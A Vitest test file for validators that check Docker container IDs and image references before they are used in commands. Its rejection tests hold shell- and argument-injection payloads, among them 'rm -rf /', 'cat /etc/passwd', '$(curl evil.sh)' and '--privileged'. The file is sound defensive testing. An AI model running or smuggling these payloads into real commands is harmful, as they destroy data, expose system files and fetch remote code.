import { describe, it, expect } from 'vitest';
import { assertValidId, assertValidImageRef, isValidId, InvalidDockerArgError } from './docker-args.js';

describe('assertValidId', () => {
  it('accepts real container ids and names', () => {
    expect(assertValidId('3f4a9c2b1d7e')).toBe('3f4a9c2b1d7e');
    expect(assertValidId('homer-caddy')).toBe('homer-caddy');
    expect(assertValidId('my_project_db.1')).toBe('my_project_db.1');
    expect(assertValidId('a'.repeat(64))).toHaveLength(64);
  });

  it('rejects shell metacharacters (command injection)', () => {
    const payloads = [
      'abc; rm -rf /',
      'abc && reboot',
      'abc | cat /etc/passwd',
      '$(touch /pwned)',
      '`id`',
      'abc\nwhoami',
      'abc$IFS$9',
      'a b',
      'abc>out',
    ];
    for (const p of payloads) {
      expect(() => assertValidId(p), p).toThrow(InvalidDockerArgError);
    }
  });

  it('rejects leading dashes (argument injection)', () => {
    expect(() => assertValidId('--privileged')).toThrow(InvalidDockerArgError);
    expect(() => assertValidId('-v/:/host')).toThrow(InvalidDockerArgError);
  });

  it('rejects empty, oversized and non-string values', () => {
    expect(() => assertValidId('')).toThrow(InvalidDockerArgError);
    expect(() => assertValidId('a'.repeat(513))).toThrow(InvalidDockerArgError);
    expect(() => assertValidId(undefined)).toThrow(InvalidDockerArgError);
    expect(() => assertValidId({})).toThrow(InvalidDockerArgError);
  });
});

describe('assertValidImageRef', () => {
  it('accepts real image references', () => {
    expect(assertValidImageRef('nginx')).toBe('nginx');
    expect(assertValidImageRef('nginx:1.25.3')).toBe('nginx:1.25.3');
    expect(assertValidImageRef('library/nginx:latest')).toBe('library/nginx:latest');
    expect(assertValidImageRef('ghcr.io/malko/homer:latest')).toBe('ghcr.io/malko/homer:latest');
    expect(assertValidImageRef('localhost:5000/app:v1')).toBe('localhost:5000/app:v1');
    expect(assertValidImageRef('nginx@sha256:abc123')).toBe('nginx@sha256:abc123');
  });

  it('rejects shell metacharacters', () => {
    expect(() => assertValidImageRef('nginx; rm -rf /')).toThrow(InvalidDockerArgError);
    expect(() => assertValidImageRef('$(curl evil.sh)')).toThrow(InvalidDockerArgError);
    expect(() => assertValidImageRef('nginx`id`')).toThrow(InvalidDockerArgError);
    expect(() => assertValidImageRef('nginx latest')).toThrow(InvalidDockerArgError);
  });
});

describe('isValidId', () => {
  it('is the non-throwing counterpart of assertValidId', () => {
    expect(isValidId('homer-caddy')).toBe(true);
    expect(isValidId('abc;rm')).toBe(false);
    expect(isValidId(undefined)).toBe(false);
  });
});
